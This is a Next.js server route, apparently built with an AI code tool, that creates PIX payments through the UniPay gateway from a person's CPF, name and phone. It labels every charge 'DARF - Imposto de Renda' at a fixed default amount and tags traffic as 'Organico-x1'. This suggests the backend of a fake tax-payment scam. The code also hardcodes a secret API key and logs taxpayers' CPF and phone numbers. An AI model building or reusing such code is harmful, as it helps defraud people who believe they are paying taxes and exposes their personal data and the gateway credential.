import { type NextRequest, NextResponse } from "next/server"

const UNIPAY_SECRET_KEY = "sk_a0aab6155b590896932e3c92f49df02c59108c74"
const UNIPAY_API_URL = "https://api.unipaybr.com/api"

export async function POST(request: NextRequest) {
  try {
    const { amount, cpf, name, phone } = await request.json()
    
    // Validações obrigatórias
    if (!cpf) {
      return NextResponse.json({ 
        success: false, 
        error: "CPF é obrigatório" 
      }, { status: 400 })
    }

    if (!name) {
      return NextResponse.json({ 
        success: false, 
        error: "Nome é obrigatório" 
      }, { status: 400 })
    }

    if (!phone) {
      return NextResponse.json({ 
        success: false, 
        error: "Telefone é obrigatório" 
      }, { status: 400 })
    }

    console.log("[v0] Creating PIX payment with UNIPAY:", { cpf, name, phone, amount })

    // Limpar CPF (remover formatação)
    const cpfLimpo = cpf.replace(/\D/g, '')
    
    // Limpar telefone (remover formatação)
    const phoneLimpo = phone.replace(/\D/g, '')
    
    // Usar o valor fornecido ou o padrão
    const finalAmount = amount || 263.23
    const amountInCents = Math.round(finalAmount * 100)

    const url = `${UNIPAY_API_URL}/user/transactions`
    
    // UNIPAY usa Basic Auth com x:SECRET_KEY
    const auth = 'Basic ' + Buffer.from(`x:${UNIPAY_SECRET_KEY}`).toString('base64')
    
    console.log("[v0] UNIPAY Auth header:", auth.substring(0, 30) + "...")

    const payload = {
      amount: amountInCents,
      currency: "BRL",
      paymentMethod: "PIX",
      customer: {
        name: name,
        email: `${cpfLimpo}@temp.com`,
        document: {
          number: cpfLimpo,
          type: "CPF"
        },
        phone: phoneLimpo,
        externalRef: `cliente-${cpfLimpo}`,
        address: {
          street: "Não informado",
          streetNumber: "0",
          complement: "",
          zipCode: "00000000",
          neighborhood: "Não informado",
          city: "Não informado",
          state: "SP",
          country: "BR"
        }
      },
      shipping: {
        fee: 0,
        address: {
          street: "Não informado",
          streetNumber: "0",
          complement: "",
          zipCode: "00000000",
          neighborhood: "Não informado",
          city: "Não informado",
          state: "SP",
          country: "BR"
        }
      },
      items: [{
        title: "DARF - Imposto de Renda",
        unitPrice: amountInCents,
        quantity: 1,
        tangible: false,
        externalRef: "darf-ir-2024"
      }],
      pix: {
        expiresInDays: 1
      },
      postbackUrl: "https://meusite.com/webhook/pagamentos",
      metadata: JSON.stringify({
        cpf: cpf,
        phone: phone,
        source: "Organico-x1",
        timestamp: new Date().toISOString()
      }),
      traceable: true,
      ip: "192.168.1.1"
    }

    console.log("[v0] UNIPAY payload:", payload)

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Authorization': auth,
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload),
    })

    const responseText = await response.text()
    console.log("[v0] UNIPAY response status:", response.status)
    console.log("[v0] UNIPAY response body:", responseText)

    if (!response.ok) {
      console.log("[v0] UNIPAY error - Status:", response.status, "Response:", responseText)
      
      // Tentar extrair mensagem de erro da resposta
      let errorMessage = `UNIPAY error: ${response.status}`
      try {
        const errorData = JSON.parse(responseText)
        errorMessage = errorData.message || errorData.error || errorMessage
      } catch (e) {
        // Se não conseguir fazer parse, usar a resposta como string
        errorMessage = responseText || errorMessage
      }
      
      return NextResponse.json({
        success: false,
        error: errorMessage,
        provider: 'unipay'
      }, { status: response.status })
    }

    let transactionData
    try {
      transactionData = JSON.parse(responseText)
      console.log("[v0] PIX transaction created successfully:", transactionData)
    } catch (parseError) {
      console.log("[v0] Failed to parse UNIPAY response as JSON:", parseError)
      return NextResponse.json({
        success: false,
        error: "Resposta inválida da UNIPAY",
        provider: 'unipay'
      }, { status: 500 })
    }

    // Extrair dados PIX da resposta UNIPAY
    console.log("[v0] Full transaction data:", JSON.stringify(transactionData, null, 2))
    
    const pixData = transactionData.pix
    const pixCode = pixData?.qrcode || transactionData.qrcode || transactionData.pixCode
    const transactionId = transactionData.id || transactionData.transactionId
    const expirationDate = pixData?.expirationDate || transactionData.expiresAt
    const customerData = transactionData.customer

    console.log("[v0] PIX data extracted:", { pixData, pixCode, transactionId, expirationDate })

    if (!pixCode) {
      console.log("[v0] No PIX QR code found in response:", transactionData)
      return NextResponse.json({
        success: false,
        error: "Código PIX não foi gerado pela UNIPAY",
        provider: 'unipay'
      }, { status: 500 })
    }

    // Calcular tempo de expiração (30 minutos se não especificado)
    const expiresAt = expirationDate || new Date(Date.now() + 30 * 60 * 1000).toISOString()

    // Gerar QR Code usando API online (sem dependências)
    let qrCodeImage = null
    try {
      // Usar API gratuita para gerar QR code
      const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(pixCode)}`
      qrCodeImage = qrApiUrl
      console.log("[v0] QR Code URL generated successfully:", qrApiUrl)
    } catch (qrError) {
      console.log("[v0] Error generating QR Code URL:", qrError)
    }

    return NextResponse.json({
      success: true,
      pixCode: pixCode,
      qrCodeImage: qrCodeImage,
      amount: finalAmount,
      transactionId: transactionId,
      expiresAt: expiresAt,
      provider: 'unipay',
      status: transactionData.status || 'waiting_payment',
      customer: {
        name: customerData?.name || name,
        email: customerData?.email || `${cpfLimpo}@temp.com`,
        phone: customerData?.phone || phoneLimpo
      },
      metadata: {
        cpf: cpf,
        phone: phone,
        source: 'Organico-x1',
        timestamp: new Date().toISOString()
      }
    })

  } catch (error) {
    console.error("[v0] Error creating UNIPAY PIX transaction:", error)
    
    // Log detalhado do erro para debugging
    if (error instanceof Error) {
      console.error("[v0] Error details:", {
        message: error.message,
        stack: error.stack,
        name: error.name
      })
    }
    
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Erro interno do servidor",
        provider: 'unipay',
        timestamp: new Date().toISOString()
      },
      { status: 500 }
    )
  }
}
